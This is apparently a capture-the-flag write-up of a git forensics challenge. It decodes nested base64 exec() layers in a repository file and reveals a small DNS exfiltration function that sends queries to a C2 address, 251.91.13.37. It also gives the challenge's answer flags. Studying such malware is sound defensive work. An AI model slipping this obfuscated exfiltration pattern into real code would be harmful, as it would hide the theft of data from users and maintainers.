# D8 — Shadow Commit ()

**Platform:** Code Repository Forensics / Git  
**Category:** Supply-chain / Malware Analysis  
**Difficulty:** Medium–Hard

---

## 🎯 Goal
Find the commit hash where a malicious change was introduced and identify the malicious IPv4 address used by the exfiltration code.

---

## 🧠 Approach
Search the git history for suspicious keywords (`base64`, `exec`, `b64decode`, `dns.query`, etc.). Inspect the identified file (`backupy/fileman.py`) which contained nested base64-encoded `exec()` calls; decode each layer sequentially to reveal the final payload and C2 IP.

---

## 🛠️ Steps / Evidence
1. `git grep base64` identified `backupy/fileman.py`.  
2. The file contained multiple `exec(ute("<base64>"))` lines. Decoded them in order:
   - `ZnJvbSBiYXNlNjQgaW1wb3J0IHVybHNhZmVfYjY0ZW5jb2Rl` → `from base64 import urlsafe_b64encode`
   - `ZnJvbSBpbyBpbXBvcnQgQnl0ZXNJTw==` → `from io import BytesIO`
   - `ZnJvbSBkbnMubWVzc2FnZSBpbXBvcnQgbWFrZV9xdWVyeQ==` → `from dns.message import make_query`
   - `ZnJvbSBkbnMucXVlcnkgaW1wb3J0IHVkcA==` → `from dns.query import udp`
   - `ZGVmIHEoc2QsIHQpOgogICAgdWRwKG1ha2VfcXVlcnkoZiJ7c2R9IiwgdCksICIyNTEuOTEuMTMuMzciLCBwb3J0PTBvNjUp` → 
     ```py
     def q(sd, t):
         udp(make_query(f"{sd}", t), "251.91.13.37", port=0o65)
     ```
     This shows the payload sends DNS queries to `251.91.13.37` (octal `0o65` = decimal 53).
3. From the git log/context around this change, the malicious commit was identified:

4. 9808069448236ee49197892308c99fd49ce7ae44

5. 
---

## ✅ Solution (Flags / Findings)
- **Malicious Commit Hash:** `9808069448236ee49197892308c99fd49ce7ae44`  
- **Malicious IP (C2):** `251.91.13.37`

---

## 📌 Reflection
This challenge demonstrated how obfuscation (nested base64 + exec) hides malicious functionality. Sequential decoding revealed DNS-based exfiltration. In a real incident, preserve the repository state, document your decoding steps, and escalate to supply-chain / legal teams as required.

